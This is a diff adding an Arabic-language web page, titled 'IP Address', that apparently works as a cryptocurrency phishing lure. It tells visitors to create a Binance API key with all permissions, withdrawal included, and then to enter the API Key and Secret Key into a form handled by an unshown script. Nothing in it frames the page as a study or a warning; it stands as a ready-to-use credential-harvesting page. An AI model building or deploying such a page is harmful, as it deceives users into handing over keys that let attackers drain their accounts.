@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP Address</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body class="bg-white text-black">
+  <div class="container mx-auto p-6">
+    <h1 class="text-5xl font-bold text-center mb-8 text-red-600 animate-pulse">IP Address</h1>
+    <div class="flex justify-center space-x-8 mb-8">
+      <i class="fas fa-network-wired icon text-black text-4xl"></i>
+      <i class="fas fa-info-circle icon text-black text-4xl"></i>
+      <i class="fas fa-headset icon text-black text-4xl"></i>
+    </div>
+    <div class="max-w-lg mx-auto mb-8 text-center bg-gray-100 p-6 rounded-lg shadow-lg">
+      <h2 class="text-2xl font-semibold text-red-600 mb-4">إزاي تعمل Binance API</h2>
+      <ul class="text-left text-gray-700">
+        <li>1. خش على Binance وسجّل دخولك.</li>
+        <li>2. روح لإعدادات الـ API.</li>
+        <li>3. اعمل API جديد وخلّي كل الصلاحيات (تداول، سحب) مفتوحة.</li>
+        <li>4. انسخ الـ API Key والـ Secret Key.</li>
+      </ul>
+    </div>
+    <form id="api-form" class="max-w-lg mx-auto">
+      <input type="text" id="api-key" placeholder="أدخل API Key" class="w-full p-3 mb-3 rounded bg-gray-200 text-black border-2 border-red-600 focus:outline-none focus:border-red-800">
+      <input type="text" id="secret-key" placeholder="أدخل Secret Key" class="w-full p-3 mb-3 rounded bg-gray-200 text-black border-2 border-red-600 focus:outline-none focus:border-red-800">
+      <p id="error-message" class="text-red-600 text-sm mb-3 hidden">عنوان الـ API غير صحيح</p>
+      <button type="submit" class="w-full p-3 bg-black text-white rounded-lg hover:bg-red-600 transition-all duration-300">التالي</button>
+    </form>
+    <div class="coin"><img src="https://i.ibb.co/2yY3W9b/bitcoin.png" alt="Bitcoin" class="w-20 h-20"></div>
+    <div class="coin"><img src="https://i.ibb.co/3z2X9kV/ethereum.png" alt="Ethereum" class="w-20 h-20"></div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
